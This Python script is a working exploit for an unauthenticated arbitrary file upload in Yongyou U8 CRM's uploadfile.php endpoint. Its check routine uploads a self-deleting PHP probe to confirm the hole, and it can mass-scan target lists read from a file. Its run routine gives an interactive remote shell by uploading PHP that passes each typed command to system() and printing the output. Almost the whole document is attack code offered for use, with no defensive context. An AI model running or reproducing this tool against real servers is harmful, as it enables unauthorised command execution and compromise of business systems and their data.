import requests
import urllib3
import string,random
from urllib.parse import urljoin
import argparse
import time
import ssl
import json
import urllib.request
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = urljoin(url,"/ajax/uploadfile.php?DontCheckLogin=1&vname=file")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
        "Content-Type": "multipart/form-data;boundary=----230982304982309"
    }
    data = """------230982304982309\r\nContent-Disposition: form-data; name="file"; filename="test.php "\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo "HelloWorldTest";unlink(__FILE__);?>\r\n------230982304982309\r\nContent-Disposition: form-data; name="upload"\r\nupload\r\n------230982304982309--"""
    try:
        response = requests.post(target, verify=False, headers=headers, data=data, timeout=15)
        if response.status_code == 200 and 'tmpfile' in response.text and 'php' in response.text and 'application' in response.text:
            data = json.loads(response.text)
            path = data["files"][0]["url"]
            result_url = urljoin(url,path)
            result_response = requests.get(result_url,timeout=15,verify=False,headers = {"User-Agent": "MMozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",})
            if result_response.status_code == 200 and 'HelloWorldTest' in result_response.text:
                print(f"\033[31mDiscovered:{url}: YongyouU8CRM_uploadfile_ArbitraryFileUploads!\033[0m")
                return True
    except Exception as e:
        pass

def run(url):
    url = url.rstrip("/")
    target = urljoin(url, "/ajax/uploadfile.php?DontCheckLogin=1&vname=file")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
        "Content-Type": "multipart/form-data;boundary=----230982304982309"
    }
    if check(url):
        while True:
            command = input("\033[34mPlease input command (stop input:exit):\033[0m")
            if "exit" not in command:
                data = """------230982304982309\r\nContent-Disposition: form-data; name="file"; filename="test.php "\r\nContent-Type: application/octet-stream\r\n\r\n<?php system("{}");unlink(__FILE__);?>\r\n------230982304982309\r\nContent-Disposition: form-data; name="upload"\r\nupload\r\n------230982304982309--""".format(command)
                try:
                    response = requests.post(target, verify=False, headers=headers, data=data, timeout=15)
                    if response.status_code == 200 and 'tmpfile' in response.text and 'php' in response.text:
                        data = json.loads(response.text)
                        path = data["files"][0]["url"]
                        result_url = urljoin(url, path)
                        result_response = requests.get(result_url, timeout=15,verify=False, headers={"User-Agent": "MMozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36", })
                        if result_response.status_code == 200:
                            print(result_response.text)
                except Exception as e:
                    print(e)
            else:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")